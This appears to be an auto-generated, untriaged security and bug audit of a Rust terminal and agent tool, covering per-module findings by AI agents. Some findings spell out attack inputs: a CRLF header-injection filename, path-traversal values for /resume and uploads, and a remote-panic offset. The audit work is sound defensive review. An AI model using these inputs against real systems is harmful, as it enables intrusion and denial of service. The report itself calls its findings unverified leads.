# Audit findings

Module-by-module audit of the tree, produced by the fleet: one `audit:<file>`
task per module over ~80 lines, taken and reported by worker agents through the
board. Generated from the blackboard — regenerate with
`scripts/audit-report.py`.

**These are reports, not verdicts.** Each is one agent's reading of one file,
and it has not been triaged. Three were spot-checked by hand when this file was
first written; all three were real, and two are already fixed (`api/view.rs`'s
broken JS literal, `remote.rs`'s doc claiming cert pinning it does not do).
Treat the rest as leads: check the code before acting on any of them.

Findings the fleet raised against its own machinery are the most interesting
ones here, because that code was hours old when it was audited.

*49 modules audited.*

### `crates/catbus-agent/src/auth.rs`

auth.rs:112-123 the refreshed credentials are written with std::fs::write (mode 0666 & ~umask, i.e. usually 0644) and the 0600 chmod happens AFTER the rename — so ~/.claude/.credentials.json, holding a live access token AND the rotated refresh token, is world-readable for the whole window, and the temp file is world-readable while being written; the file must be CREATED 0600 (OpenOptions::mode) not fixed up afterwards, and line 122 discards the chmod result so a failure leaves it 0644 silently; auth.rs:107-118 the rotated refresh token can be LOST: do_refresh() succeeding means the server has already invalidated the old refresh token, but the new one only reaches disk at 117-118 — any failure there (ENOSPC, read-only fs, EACCES) returns a generic AuthError::Io while the on-disk file still holds a now-DEAD refresh token, permanently breaking Claude Code itself and every future catbus-agent start, with nothing in the error hinting that the user's login was just invalidated; auth.rs:117-118 the comment at 109-111 claims the write is atomic 'because a partial write would brick auth', but there is no fsync of the temp file before the rename and no fsync of the directory after — rename gives atomicity of the NAME only, not durability of the CONTENTS, so a crash can leave a present-but-empty credentials file, which is exactly the failure the comment says it is preventing; auth.rs:74+167(main.rs) one Auth is loaded per catbus-agent PROCESS and there is one process per agent tab, plus Claude Code itself owning the same file — nothing coordinates them: no file lock, and access_token() never re-reads the file before deciding to refresh, so agent A refreshes and rotates, agent B still holds the superseded refresh token in memory, B's next refresh 401s, and B has NO recovery path (it cannot reload). With many tabs this is the normal case, not an edge case; auth.rs:88-91 the reqwest client is built with no .timeout(), and the tokio Mutex on blob is held ACROSS the whole network refresh (99-124) — a hung token endpoint blocks every other access_token() caller in the process indefinitely; auth.rs:91+116 two .expect() panics in what is otherwise a Result-returning API (reqwest client build can fail on TLS backend init; serialisation is infallible today but the expect is load-bearing) — a library-level panic instead of an AuthError variant; auth.rs:100-103+164-166 now_ms falls back to 0 when the clock predates UNIX_EPOCH, so expires_at > 60000 holds and a long-expired access token is returned forever (confusing 401s downstream), while the same fallback at 164 writes an expires_at near 1970 so every later call re-refreshes and re-rotates; auth.rs:170 now_ms + body.expires_in * 1000 is unchecked on server-controlled input — a bogus expires_in overflows (panic in debug, wrap in release) into a nonsense deadline; saturating arithmetic is called for; auth.rs:74-84 load() never checks the credential file's own permissions, so a 0644 credentials file is used without a word

### `crates/catbus-agent/src/main.rs`

main.rs:178 --print-socket is handled AFTER auth::load() (167) and session::open() (169), so the API server's 'cheap path lookup' fails on machines without Claude OAuth and creates an empty {uuid}.jsonl as a side effect (session.rs:70 create(true)); with --name it also renames before returning (172); main.rs:176 vs 414 socket path is derived once from the initial session, /resume swaps the session but the socket keeps the OLD session-id filename, so clients that build the path from the new id can never reach it; main.rs:200 socket_task.abort() skips the remove_file cleanup at socket.rs:76 (there is no Drop impl, the comment at 198 is wrong) so Ctrl-D leaves a stale socket and clients get ECONNREFUSED until the next start; main.rs:549 on cancel-timeout tokio::time::timeout(_, work) DROPS the JoinHandle, which detaches rather than aborts, so a stuck tool keeps running and keeps appending to the transcript after the REPL moved on; main.rs:504-544 the Ctrl-C watcher lives only inside the spinner loop and the loop breaks as soon as agent.status is None, so if the spawned turn has not set a status within the first 120ms the REPL blocks on work.await with NO SIGINT handler and Ctrl-C kills the process instead of cancelling the turn; also tokio::signal::ctrl_c() is re-created every iteration so a signal landing outside the select window is dropped; main.rs:559 the token sidecar is saved only on the Ok path, so usage from an errored or interrupted turn is lost even though the tokens were billed; main.rs:604 set_tab_status spawns tab-atelier and drops the Child without waiting, leaking a zombie per status update (2+ per prompt) for the life of the REPL; main.rs:410 /resume <id> never validates the id exists and session.rs:70 creates the file, so a typo silently starts a fresh empty session under the typo instead of erroring; main.rs:352 /deb runs cargo deb --no-build in the arbitrary session cwd with no -p tab-atelier, so it packages stale target/ artifacts and can select the wrong workspace package; main.rs:313 line.trim().trim_matches('`') strips backticks from EVERY prompt, mutating code-snippet prompts before they reach the model; main.rs:527/292/298 .expect() on the status mutex and editor slot panics the REPL on poisoning, against the repo no-unwrap rule; main.rs:128 infomaniak_model has a default_value and no requires, so --infomaniak-model alone is accepted and silently ignored; main.rs:252 history falls back to the predictable shared /tmp/catbus-agent/history.txt holding full prompt text when XDG_STATE_HOME and HOME are both unset

### `crates/catbus-agent/src/session.rs`

session.rs:62-70 resume_id is interpolated into a filename with zero validation — no uuid parse, no rejection of separators — and main.rs:410 feeds it straight from the REPL /resume argument, so /resume ../../../../tmp/x or an absolute /resume /etc/whatever escapes the project dir entirely (Path::join with an absolute id discards the prefix) and OpenOptions::create+append then CREATES and appends JSONL to it; transcript_path, default_socket_path, save_tokens and rename all inherit the same unchecked id, so the .name/.tokens.json/.sock sidecars land there too; session.rs:67+95-115 with no --resume and new_session=false, open resumes the newest .jsonl in ~/.claude/projects/escaped-cwd — but the module doc itself says that directory is SHARED with Claude Code, so in any cwd where the human has used claude, catbus silently opens the users real Claude transcript in append mode and writes its own entries into it, chaining parentUuid onto Claude last entry; nothing distinguishes a catbus-authored file from a claude-authored one; session.rs:277-288+419-428 a crash mid-append leaves a partial final line with no trailing newline; last_entry_uuid tolerates it by skipping the unparseable tail, but the next append writeln! concatenates onto that partial line and produces one permanently corrupt merged entry — the recovery path hides the damage rather than repairing it; session.rs:379-397 save_tokens and rename use fs::write, i.e. truncate-then-write with no tmp+rename, while tab-atelier POLLS tokens.json from the same dir — a poller that reads during the window gets an empty or half-written file, and a crash there leaves the sidecar permanently truncated; session.rs:186-191 last_exchanges bakes raw ANSI escapes into Exchange.assistant_text, so this data-shaped API is only correct for a terminal — any JSON/API consumer of the preview gets literal escape bytes; session.rs:142-143+215-227 the ring keeps only the last 2n turns, so when the tail is dense with tool-only assistant turns (which are dropped at :193) the pairing can return far fewer than n exchanges although more exist earlier in the file — the preview silently thins out on tool-heavy sessions; session.rs:107-114 latest_session_id keys on file_stem, so a file like a.b.jsonl yields the id a.b and an empty --resume gives a hidden .jsonl whose Path::extension is None, making that session invisible to every later resume/list; session.rs:422-434 every lock uses .expect on poison — one panic anywhere holding the transcript, name or last-uuid mutex turns every later append into a panic instead of a SessionError, which the error type already models; session.rs:96-114 vs 355-372 latest_session_id and list_sessions duplicate the same read_dir/skip-empty/mtime scan with slightly different outputs, so a rule change (say, ignoring foreign transcripts) has to be made twice

### `crates/catbus-agent/src/tools/delegate.rs`

delegate.rs:84 the reply loop hard-fails on ANY unparseable line (`malformed frame`), while the handshake loop at :57 silently ignores the same thing — so an added frame kind (`{\"kind\":\"tool_use\"}`, a heartbeat) aborts an in-flight delegation that the handshake would have tolerated; the enum has no #[serde(other)] catch-all, so there is zero forward compatibility between agent versions on the reply path only; delegate.rs:51+78 lines.next_line() grows its String without any cap — a runaway or hostile target agent that streams one unterminated multi-GB line ooms the caller, and the only backstop is the wall-clock timeout, which does not bound memory; delegate.rs:84 that error also interpolates the entire offending line into the message (`malformed frame `{line}``), so an arbitrarily large / secret-bearing frame from the target lands verbatim in the caller's tool result and logs; delegate.rs:101-103 the doc claims target accepts a 'session-id, socket-path, or relative path' but a relative path can never resolve: :111 requires is_absolute(), and :114's `!target.contains('/')` guard sends anything with a slash straight to the error at :127 — relative paths are documented and unreachable; delegate.rs:34-38 timeout_secs is only upper-capped: `timeout_secs: 0` yields Duration::ZERO and the call dies instantly with 'timed out after 0s', and a float/negative value is silently rejected by as_u64 and falls back to the 5-min default rather than erroring, so a caller mistyping the arg gets no signal; delegate.rs:111-113 an absolute target is accepted on `exists()` alone with no file-type check, so pointing at a regular file or directory produces a raw ECONNREFUSED/ENOTSOCK connect error instead of 'not a socket' (and it is TOCTOU against the connect at :41); delegate.rs:120-125 the session-id scan returns the FIRST `<id>.sock` found while read_dir order is arbitrary — the same session id present under two project dirs resolves non-deterministically, with no ambiguity error; delegate.rs:50-66 the protocol reads the greeting BEFORE writing the prompt, so if a target ever emits `started` lazily (after the first request) instead of on accept, both sides block and the call burns the full timeout with no version/capability negotiation to detect it; delegate.rs:136-139 Frame::Chunk deserializes `text: String` and immediately drops it — every streamed chunk from the target costs a full allocation for data that is discarded

### `src/agent_probe.rs`

agent_probe.rs:213 sample_tree reads only /proc/<pid>/task/<pid>/children — the MAIN thread's children; a process forked from any other thread is listed under /proc/<pid>/task/<tid>/children and is therefore invisible to the walk. claude is bun-compiled and spawns via libuv worker threads, so the very subtree this module exists to measure can be silently undercounted in cpu_ticks/rss/procs/ctxsw; needs a pass over task/*/children; agent_probe.rs:113-134 dt is derived from SystemTime (wall clock), not a monotonic Instant — an NTP step or suspend/resume corrupts every rate on the line: a forward step dilutes cpu_pct toward 0 with no signal, a backward step makes duration_since() Err so the sample is dropped; ts needs wall-clock but dt needs Instant, so both must be carried; agent_probe.rs:123-133 prev is keyed by TAB NAME alone and never validated against pid — if the agent restarts between two ticks under the same tab the new process's counters start near zero, rate() clamps every delta to 0, and the first post-restart line reports a confident 0% CPU / 0 ctxsw instead of being skipped (the comment at 118-121 only covers 'gone at sample time'); a tab RENAME also orphans the map entry forever, since forget() is later called with the new name; agent_probe.rs:513-521 state_base() duplicates platform::linux::state_base_dir() ONLY, but platform::windows::state_base_dir() returns local_app_data() — flag_enabled reads read_flags(&state_base()) while set_persisted_flag writes under the CALLER's base, so on Windows 'tab-atelier flags probe on' writes %LOCALAPPDATA%/tab-atelier/flags.json and the reader looks in $HOME/.local/state/... (or /tmp/.local/state when HOME is unset): the persisted toggle silently never takes effect and probe logs land somewhere nothing else lists; the doc at 509-511 claims it mirrors platform::state_base_dir(), it mirrors one of the two; agent_probe.rs:484-486 read_latest parses the ENTIRE log (up to the 4 MiB rotate cap, ~20k lines) into a Vec<ProbeLine> and then pops the last element — a full parse plus 20k allocations to answer 'what is this tab doing right now'; agent_probe.rs:471 read_all never reads the rotated .jsonl.1 written at 461, so the documented 'whole probe timeline' silently loses up to half the history immediately after a rotation; agent_probe.rs:208 rss_kb is summed across the subtree, double-counting shared pages (COW heap after fork, shared libc/text), so ProbeLine.rss_mb systematically OVERSTATES the footprint — which is the exact number the module exists to diagnose; smaps_rollup Pss is the honest measure; agent_probe.rs:548-557 which() tests is_file() but not the executable bit, so a non-executable 'strace' on PATH is accepted and the failure resurfaces as an opaque shell error at agent launch; agent_probe.rs:530-543 any non-bool value of TAB_ATELIER_AGENT_TRACE implies ENABLED, so a typo (TAB_ATELIER_AGENT_TRACE=yeah) silently switches tracing on and then resolves no tracer at all; agent_probe.rs:191 the walk has no visited set and no depth bound, so a pid seen twice (reuse mid-walk, re-parenting) is summed twice; agent_probe.rs:452-465 append_line does create_dir_all + metadata + open + write + close per tab per 2 s tick with no cached fd; agent_probe.rs:35-38 the CLK_TCK=100 rationale ('reading it means an unsafe sysconf call') is not real — AT_CLKTCK is readable from /proc/self/auxv with no unsafe; the value happens to be right on the supported targets, so this is about the comment, not the number

### `src/agent_reaper.rs`

agent_reaper.rs:167-177+126-127 kill_group ignores the exit status of kill(1) while reap_orphans unconditionally does killed += 1 and freed_mb += rss, so the reported "reaped N, freed X MB" is never verified; worse, the command is the bare name kill resolved through PATH (net_nft::nft_bin resolves absolute paths precisely because a launcher-provided PATH may be minimal) — /bin/kill missing means the reaper silently kills nothing and still reports a full successful sweep, and a.session is documented as being for logging but is never logged anywhere in the module; agent_reaper.rs:76-97 the record is rewritten with fs::write (truncate-in-place, no tmp+rename) on EVERY tick, so a crash inside that window leaves a truncated or empty file — and a crash is exactly the case the whole feature exists for: reap_orphans then fails to parse at :115, returns an empty report, and the ghosts survive; agent_reaper.rs:112-117 both early returns skip the remove_file at :131, so an unparseable or unreadable record is retried at every single startup forever instead of being cleared; agent_reaper.rs:24-27+122 the zero-collateral argument holds only WITHIN ONE BOOT: start_time is ticks since boot, the record file is persistent, and nothing stores a boot id or /proc/stat btime — after a reboot a stale record can match an unrelated process that happens to get the same pid at the same tick offset, and that process is then SIGKILLed along with its whole group; agent_reaper.rs:60-62+76 the record is a single unscoped file in the state dir with no owning-instance marker, so two GUIs sharing a state dir clobber each other every tick, and the second one starting up runs reap_orphans against the FIRST ones still-live agents whose pid+start_time match exactly — it SIGKILLs the running instance fleet, which the module doc claims is impossible; agent_reaper.rs:41-43+167 the doc asserts pid == pgid because agent tabs exec claude, but that is never verified before kill -- -PID; the launch path can interpose wrappers (setpriv, bwrap, the strace probe wrap), and nothing here re-checks that the recorded pid is still a group leader; agent_reaper.rs:156-161 proc_rss_mb hardcodes a 4 KiB page (pages * 4 / 1024) — wrong on any arm64 kernel with 16K/64K pages, where the freed figure is off by 4-16x; it also sums per-process RSS, so shared pages are counted once per process and the total is optimistic by construction; agent_reaper.rs:142-161 the module is compiled on every platform but reads /proc unconditionally, so on non-Linux proc_start_time is always None: record_live_agents writes an empty list and reap_orphans reaps nothing, silently, with no cfg gate and no log; agent_reaper.rs:67-69+77+108 reap_enabled is consulted independently at record and at reap time, so toggling the flag off leaves the last record on disk indefinitely and a much later re-enable reaps against an arbitrarily old (likely post-reboot) record — the interaction with the missing boot-id guard is what makes that dangerous rather than merely stale

### `src/api/assets.rs`

6 findings: no Vary+shared ETag across gzip/identity under immutable caching; openapi_spec() re-reads disk per unauth request (no LazyLock); immutable max-age on term-symbols.woff2 which has no version/query cache key; woff2+PNGs gzipped pre-auth (woff2 grows +38B); duplicated allowlist with _ => MAIN_CSS catch-all defeating exhaustiveness; api-catalog arm bypasses respond_with_etag (no ETag/304)

### `src/api/catbus.rs`

catbus.rs:37/73/125 session is not per-tab: find_session->newest_session() picks newest *.jsonl in the cwd-derived project dir, so N tabs agenting in the same repo all resolve to ONE transcript+socket -> /catbus/message can hit another tab's agent and /catbus/messages returns another tab's conversation; the per-tab agent_session_id already on the snapshot (api.rs:480) is ignored; catbus.rs:91 no lock gate — input.rs:27 refuses keystrokes 403 on LockState::effective_locked but catbus::message injects a full prompt (stronger than a keystroke) with no such check, so a manually-locked or schedule-closed tab still takes work over HTTP (read_only IS centrally gated at api.rs:1818, lock is not); catbus.rs:135 total = since + tail.len() trusts the client cursor — ?since=99999 on a 10-msg transcript answers total:99999 messages:[], and after a transcript compaction shrinks the count the saved cursor stays past EOF and total is permanently wrong; total should be the real parsed count; catbus.rs:77 socket derived as file_path.with_extension("sock") but find_session also matches plain Claude Code TUI sessions which have no socket -> POST /catbus/message on a claude tab yields 502 'agent socket: connect ... No such file' instead of a 4xx, and GET /catbus exposes no kind field so a client cannot tell promptable from not before trying; catbus.rs:91 blocking send with 10-min read timeout (catbus_agent.rs:425) on the spawn_blocking pool, no cancellation on client disconnect — an aborted mobile request still pins a thread and the agent still runs the prompt, so retries silently queue duplicate prompts; catbus.rs:130-139 unbounded response: whole remaining transcript incl. thinking + tool payloads materialised and serialized in one body, no lines/size cap unlike output.rs -> multi-MB body on long sessions

### `src/api/env.rs`

env.rs:113-132 parse_env_body never reads `respawn` even though it is part of the documented body schema at :51 and :113 — EnvChange is built with only {tab,set,unset}, so a client sending {\"respawn\":true} gets 200 {\"queued\":\"env\"} and the flag is silently discarded; the one semantically loaded field in the API is documented, accepted, and ignored; env.rs:122+129 non-string values are silently filtered out: {\"set\":{\"PORT\":8080}} (a JSON number, the obvious client mistake) drops the entry and still answers 200 'queued' — the endpoint reports success for a change it did not record, and the same applies to non-string members of `unset`; env.rs:115-131 there is no validation that the body is even an object or that the resulting change is non-empty: `null`, `[]`, `\"hello\"` and `{}` all parse, `v.get(\"set\")` returns None on each, and an empty EnvChange is pushed and answered 200 — every syntactically-valid-but-meaningless body succeeds; env.rs:55+80 pending_env_changes is an unbounded Vec with no cap, no dedup and no backpressure, and combined with the above every request (including the empty no-op changes) grows it — a client looping on POST /env while the main loop is not draining (no tabs, paused, shutting down) grows the queue without bound behind the global snapshot mutex; env.rs:117-125 `set` keys are passed through with no validation whatsoever — no check for empty, for NUL, or for '=' — so {\"set\":{\"A=B\":\"C\"}} reaches the child-process environment construction where a key containing '=' is either rejected downstream or splits into a different variable than the caller named; there is also no denylist, so LD_PRELOAD / PATH / LD_LIBRARY_PATH are settable over the network on an endpoint whose documented sibling flag respawns the tab's shell; env.rs:69-88 set_tab checks the tab BEFORE reporting a parse error: the body is parsed at :69 but the Err arm at :84 is only reached after resolve_tab_idx succeeds, so a malformed body aimed at a nonexistent tab returns 404 'tab not found' instead of the 400 that set_global (:52-60) returns for the identical body — the same client bug surfaces as two different diagnoses; env.rs:32+66 'missing tab id' is answered 404, but a path that carries no tab id at all is a malformed request, not a missing resource — 400 is the correct code, and returning 404 makes 'you sent the wrong URL' indistinguishable from 'that tab is gone'; env.rs:26-47 list_tab serves `snap.tabs[idx].tab_env`, which by its own doc (:28-30) only catches up 'as soon as the next snapshot rebuild lands' — a client that POSTs a change and immediately GETs reads stale values with no version, ETag or queued-change marker to tell it so, making the API read-after-write incoherent by design and silently; env.rs:97-102 the mask is total, so an empty value and a real secret both render as '******' — an operator cannot tell an unset-but-present variable from a set one, on the one endpoint built for eyeballing configuration; env.rs:134-148 the tests cover only mask_env_value: parse_env_body — the module's whole validation surface, and the source of the silent drops and the ignored respawn above — has no test at all, so none of those behaviours is pinned

### `src/api/files.rs`

files.rs:216-238 HEADER INJECTION: ascii_fallback filters only '"' and '\\' but not CR/LF, and display_name is a real on-disk filename, so a file named "a\r\nX-Evil: 1.txt" splits the response via Content-Disposition — reachable end-to-end because sanitize_basename (api.rs:963) strips no control characters, so POST /files?name=a%0d%0aX-Evil:1.txt plants the name and any later GET injects headers; files.rs:212 download reads the whole file into RAM with std::fs::read and NO size cap — upload is capped at 100 MiB but a 10 GB file in outbox/ (agent-produced, unbounded) is fully buffered before the response, and unlike upload there is no per-token concurrency cap on download either, so N concurrent GETs of a big file OOM the process; files.rs:39 the UploadSlot cap is acquired AFTER the router has already allocated vec![0u8; content_length] and read the body (api.rs:1661-1662), so the 429 fires with the 100 MiB already committed — the mitigation its own comment claims ('can't queue dozens of concurrent 100 MiB POSTs and amplify memory pressure') does not hold; the cap is also per-token with provided_token.unwrap_or("") at :38, so every master-token/local-CLI upload shares one bucket and legit CLI uploads 429 each other, while total in-flight memory stays unbounded at tokens x cap x 100 MiB; files.rs:128 staging name is the FIXED ".{name}.tmp" and write_new_file_no_symlink (api.rs:817) does remove_file-then-create_new, so two concurrent POSTs with the same ?name= race: one gets EEXIST 500, or B unlinks A's staging mid-write and A's rename fails ENOENT while B renames possibly-truncated data over dest — no uniquifier, no lock; files.rs:141-147 the 201 body echoes dest.to_string_lossy(), the tab's ABSOLUTE server path, straight to a share-token holder — the download half of this same file goes out of its way not to (:210-211 'do not echo the absolute server path'), so the two routes contradict each other and upload leaks the home dir/username; files.rs:73-77 upload refuses a locked tab with 423 but download has no lock check at all, so a share recipient can keep reading inbox//outbox/ while the operator has paused the session; files.rs:84 sanitize_basename silently REWRITES rather than rejects — ?name=../../etc/passwd becomes 'passwd' and the upload succeeds under a name the client never asked for; it also imposes no length limit, so a 255-byte legal name produces a 260-byte ".{name}.tmp" staging path that fails ENAMETOOLONG with a 500 for a filename the OS would have accepted; files.rs:52+164 a malformed tab key answers 404 'invalid tab key' where 400 is the correct status

### `src/api/limits.rs`

limits.rs:46+97 memory_max is validated but NOT bounded — parse_memory_bytes (lib.rs:1414) accepts "0"/"0G", so {"memory_max":"0"} passes memory_max_valid, gets 200, and cgroup.rs:159 writes memory.max=0 which OOM-kills every process in the tab instantly; same class: tasks_max:0 is accepted and cgroup.rs:165 writes pids.max=0 so the tab can never fork again — neither has a sane floor, and both are reachable from an authenticated POST with no confirmation; limits.rs:33-36 and 84-88 numeric fields are parsed leniently and dropped SILENTLY on any type mismatch — cpu_quota_percent of -50, 2.5, "200" (string), or >u32::MAX all become None; if paired with a valid memory_max the request returns 200 with the cpu cap silently absent, so the caller believes it capped CPU and did not (asymmetric with memory_max, which is strictly rejected); lib.rs:1376 cpu_max_line returns None for pct==0 while merge() stores Some(0), so cpu_quota_percent:0 is accepted and then makes resolve() shadow the GLOBAL default with a value that means 'unlimited' — setting 0 on a tab silently REMOVES the inherited cpu cap instead of pinning it; limits.rs:55 set_default OVERWRITES pending_default_limits (= Some(..)) instead of pushing to a Vec like the per-tab route at :112, so two `limit --all` calls landing between owner drains lose the first one entirely, still answering 200 {queued:"default-limits"} for the one that got dropped; limits.rs:77-96 clear:true and explicit axis values are accepted together with no error — consumers (app.rs:2560, headless.rs:2118) take the clear branch and discard `over` wholesale, so {clear:true,memory_max:"8G"} silently lifts all limits rather than resetting-then-setting; app.rs:2579 gates the whole default-limit apply (including preferences persistence) behind cfg(target_os="linux"), so on non-Linux this route returns 200 queued and nothing is ever applied or saved — no 501/notice to the caller; limits.rs:19-53 vs 70-104 are ~90% byte-identical including both error strings, so the two routes' validation will drift

### `src/api/output.rs`

api/output.rs:219 payload[start_offset..] indexes an Arc<str> with a client-controlled byte offset — str RangeFrom PANICS when start_offset is not a UTF-8 char boundary, and the only guard is n <= total_len at :96, not a boundary check; the CRC gate is no protection because any share-link viewer can read the payload and compute crc32 of a mid-codepoint prefix, so ?since=<non-boundary N>&crc=<matching> is a remote panic/DoS on a public endpoint (payloads routinely contain multi-byte box-drawing and emoji); the fix shape is is_char_boundary or slicing as_bytes(), note :103 already slices bytes safely so the asymmetry is easy to miss; api/output.rs:110 vs :131-137 X-Cursor-Row carries two different coordinate systems depending on which mode fired — since-mode ships the ABSOLUTE full-buffer row (:110 full_cursor) while lines-mode rebases it by drop_count — with nothing in the response naming the convention, so a client that uses both modes silently mispositions the cursor by drop_count rows; api/output.rs:96+115 when since is stale (n > total_len, i.e. the scrollback ring shifted or the screen cleared — exactly the case the delta protocol exists for) the guard falls through to the query_lines arm, so a client sending since+crc+lines gets a line-tail instead of the full resync it asked for, and its cursor convention flips per finding above; api/output.rs:111-113 a CRC mismatch discards query_lines entirely and ships start_offset 0, so a viewer polling ?since&crc&lines=200 gets the WHOLE scrollback (hundreds of KB) on any alt-screen swap rather than the 200-line tail it bounded itself to — a surprising bandwidth cliff at exactly the moment the tab is busiest; api/output.rs:117-130 lines-mode walks the payload twice (lines().count() then a second find('\n') scan), which is the same O(n) cost the comment at :58-62 went to the trouble of moving out from under the snapshot mutex; api/output.rs:225 the ETag is emitted only for full bodies but the 200 response for a delta still carries no ETag while X-Output-Start varies per request, so the same URL+query can yield different bodies as the buffer grows — with no Vary/Cache-Control visible here an intermediary cache has nothing correct to key on; api/output.rs:131-137 when the cursor row is above the dropped region the header is omitted entirely rather than clamped, so the viewer keeps its previous (now wrong) blink position instead of being told; api/output.rs:63-67 the raw_output.is_empty() fallback silently switches which buffer (and which CRC) the client is tracking mid-session; the mismatch path recovers, but X-Output-Length then changes discontinuously with no signal that the coordinate space changed

### `src/api/view.rs`

7 findings; top: view.rs:84 trim_matches('"') eats an escaped trailing quote so a tab name ending in " emits a broken JS string literal and bricks the viewer; view.rs:56 asset_depth ignores the trailing slash api.rs:1626 strips, so /view/ 404s all CSS+JS; CSP has no manifest-src so default-src 'none' blocks the shipped site.webmanifest

### `src/bin/tab-atelier-headless.rs`

bin/tab-atelier-headless.rs:88 ctrlc::set_handler is the ONLY signal handler installed anywhere in the tree (grep: no sigaction/signal_hook/SIGTERM handler exists), and Cargo.toml:139 pins ctrlc with default-features = false, which turns OFF its 'termination' feature — so only SIGINT is caught and SIGTERM is not; that is systemd's default KillSignal, so 'systemctl stop' kills the daemon on the default disposition with SHUTDOWN_REQUESTED never set, no state persist, and none of the graceful tab teardown at headless.rs:1182-1192 — meanwhile headless.rs:780/786 and lib.rs:85 all document 'SIGINT/SIGTERM' and 'Returns Ok(()) on a clean shutdown via SIGTERM', a claim the build config cannot satisfy; bin/tab-atelier-headless.rs:67 vs :62 same ordering defect as src/main.rs:64 — READ_ONLY is stored AFTER dispatch(), which process::exits inside, so '--read-only <subcommand>' runs with read_only() false; the clap help already admits 'only meaningful when no subcommand is given', which argues for conflicts_with rather than silently accepting it; bin/tab-atelier-headless.rs:55 vs :62 --relay IS seeded BEFORE dispatch here while src/main.rs:75-77 seeds it AFTER — the two binaries set the same global on opposite sides of the exit point, and seeding it here is pointless work for a process that is about to exit inside dispatch; --claude-only is read and applied in src/main.rs:58+71-73 but does not exist at all in this file even though the shared Cli carries the flag, so 'tab-atelier-headless --claude-only' parses and silently does nothing; bin/tab-atelier-headless.rs:69 re-loads READ_ONLY through a SeqCst global one line after storing it, instead of using the local read_only the way src/main.rs:79 does — two copies of the same guard that already differ; bin/tab-atelier-headless.rs:44-49 --check-crypto is byte-identical to src/main.rs:50-55 and carries the same two problems: it exits(0) before dispatch so it silently swallows any subcommand on the same line, and it binds the ServerConfig to _config and drops it, proving only that the builder did not panic rather than that a cert can be resolved — six duplicated lines that belong next to install_rustls_provider in the lib; bin/tab-atelier-headless.rs:38 Cli derives #[command(version)] (dispatch.rs:40) so clap handles -V/--version and exits right here, which makes the manual 'args().any(|a| a == "-V")' scan at headless.rs:806-809 unreachable dead code — the same shape as the GUI's orphaned --check; bin/tab-atelier-headless.rs:83-86 try_run_as_service() collapses 'not launched by the SCM' and 'failed to attach to the SCM' into one bool, so a real service-attach failure silently degrades to console mode; the logger is not installed until headless.rs:793-804, i.e. after clap, --check-crypto, dispatch, the single-instance-lock failure and the service attach, so the 'another instance is already running' exit at :69-76 and every early failure leave nothing in the log; no tests

### `src/box_drawing.rs`

box_drawing.rs:141-196 the centre-to-edge bars deliberately OVERLAP at the cell centre (h_left spans 0..cx+t/2 and h_right spans cx-t/2..cell_w, likewise up/down), which is fine for an opaque fill but double-blends for any translucent foreground (dim/faint text, themed alpha) — every cross, tee and corner then shows a visibly darker square at its junction; box_drawing.rs:116-128 the same issue makes the coalescing fast path and the per-cell path disagree: h_bar's doc at :111-114 claims it paints 'exactly the union' of rects's two bars, true geometrically but h_bar emits ONE quad where rects emits two overlapping ones, so a translucent '─' run renders at a different opacity depending on whether the run coalesced; box_drawing.rs:124+148-149+162+170 nothing is snapped to device pixels — only the *thickness* is rounded (:102), the positions are raw cell_h/2 - t/2 and cell_w/2 - t/2, so an odd cell height (cell_h=19 -> y=8.5) or the usual fractional cell width puts a 1px rule on a half-pixel boundary and the GPU antialiases it across two rows at half opacity: the exact blurry/dashed symptom the module's header says it exists to fix; box_drawing.rs:101-103 stroke thickness derives from cell_h ONLY and is never clamped against cell_w, so on a condensed font or a large size where heavy (2*round(cell_h/12)) exceeds cell_w the vertical bar gets x = cx - v/2 < 0 and w > cell_w — it paints outside its own cell and bleeds over the neighbouring column, with no guard; box_drawing.rs:117-121 h_bar and rects disagree for any weight outside 0..=2: BoxParts is pub with pub fields and no validating constructor (new is private), so a caller building BoxParts{left:3,right:3,..} gets a LIGHT bar from h_bar (the `else light` branch) but NOTHING from rects (weight_px returns 0.0) — the two paths silently paint different ink for the same input; box_drawing.rs:66-96 parts() omits the pure single-direction stems '╴╵╶╷' (light) and '╸╹╺╻' (heavy), which map onto BoxParts exactly (e.g. '╶' = new(0,1,0,0)) and are not an inherent limitation like the doubles/diagonals the doc excludes — they fall back to the font, so a stem and the '─' it abuts render at different thicknesses and don't join; box_drawing.rs:103 the `.max(2.0)` on heavy is unreachable: light is already `.max(1.0)`, so light*2 >= 2.0 always — the guard reads as protecting small cells but does nothing; box_drawing.rs:141 rects has no guard for cell_w/cell_h <= 0 (a zero-height cell yields light=1 and y=-0.5, a bar outside the cell) and :195 returns a fixed [Rect;4] whose unused tail is Rect::default() — a caller that drops the `n` paints up to four 0x0 quads at the origin with no compiler help

### `src/briefs.rs`

briefs.rs:95-102+117 a misspelled front-matter key is accepted, kept, and then silently NEVER applies: parse_front_matter takes any 'k: v' line, parse_brief only looks up 'basedir', so 'baseDirs:', 'base_dir:' or a stray leading space produces a Brief with empty base_dirs and always=false — specificity() returns None everywhere, load_all still pushes it (body non-empty), and the session gets nothing with no warning at any layer; cli/brief.rs:68 only reveals it as an empty baseDir list, and only if the user thinks to run --list; briefs.rs:152-153+199 the documented precedence ('machine-wide first so a user's own briefs sort after and read as the later word') is NOT implemented — select() tiebreaks equally-specific briefs on the full source PATH STRING, so it holds only by the lexicographic accident that '/etc' < '/home'; with XDG_CONFIG_HOME=/data/... (or any config base sorting before /etc) the user's brief lands FIRST and the machine-wide one becomes the later word, exactly inverting the stated rule — the tiebreak needs an explicit source-dir rank; briefs.rs:39+217 MAX_TOTAL is documented in CHARACTERS but every measurement is body.len(), i.e. BYTES: for the accented French prose this repo's author writes, the real budget is silently 20-40%% smaller than the 6000 advertised; briefs.rs:209-241 cap is not a cap — the '(N more ... omitted)' note is appended AFTER the budget check so the result overshoots by ~60 chars, and a single brief larger than cap is emitted whole (deliberate per the test at 346-348, but the doc at 34-39 reads as a hard limit); briefs.rs:62 baseDir is matched raw with no normalisation: a relative baseDir never matches an absolute cwd, '..' segments are not resolved (Path::starts_with is purely component-wise), and a symlinked cwd fails to match its real target — all three fail SILENTLY, indistinguishable from 'no brief configured'; briefs.rs:124-127 'always' accepts only true/yes/1 while agent_probe::parse_bool in the same crate also accepts 'on'/'off' — 'always: on' silently evaluates false; briefs.rs:180 a file that is nothing but front matter is dropped with no diagnostic, and cli/brief.rs:68 then reports a 'brief file(s) loaded' count that excludes it, so the user sees a number that disagrees with their directory listing; briefs.rs:209-241 render concatenates bodies with a bare blank line and no attribution — /etc/tab-atelier/briefs (machine-wide, potentially another admin's) and ~/.config briefs are injected into the agent's context indistinguishable from each other and from the built-in brief, so nothing lets an agent weigh a system-wide instruction 